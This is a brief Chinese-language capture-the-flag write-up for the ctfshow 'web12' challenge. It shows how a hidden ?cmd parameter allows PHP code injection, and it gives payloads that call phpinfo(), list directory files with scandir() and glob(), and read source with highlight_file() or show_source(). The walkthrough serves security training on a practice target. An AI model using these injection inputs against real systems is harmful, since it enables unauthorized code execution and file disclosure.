## ctfshow web12
考察:命令执行
知识点:
```
glob() 函数返回匹配指定模式的文件名或目录。
举个例子:
glob("*") 匹配任意文件
glob("*.txt")匹配以txt为后缀的文件
```

查看网页源代码发现 ?cmd
![图片](https://user-images.githubusercontent.com/81904597/113653035-9822ae00-96c7-11eb-9fbe-2ee06d317b0c.png)
目测考察命令执行
输出一下phpinfo()
```
?cmd=phpinfo();
```
里面禁用了很多函数
![图片](https://user-images.githubusercontent.com/81904597/113653163-e172fd80-96c7-11eb-88c1-a5df058909e2.png)

查看一下目录的文件(两种方式)
```
?cmd=print_r(scandir('.'));
?cmd=print_r(glob("*"));
```
![图片](https://user-images.githubusercontent.com/81904597/113653282-1ed78b00-96c8-11eb-9319-97b2312427af.png)
利用下面的让代码显示一下即可
```
highlight_file()
show_source()
```
参考yu师傅博客:https://blog.csdn.net/miuzzx/article/details/104372662

[反序列化.pdf](https://github.com/Demodd/Demodd.github.io/files/6291477/default.pdf)
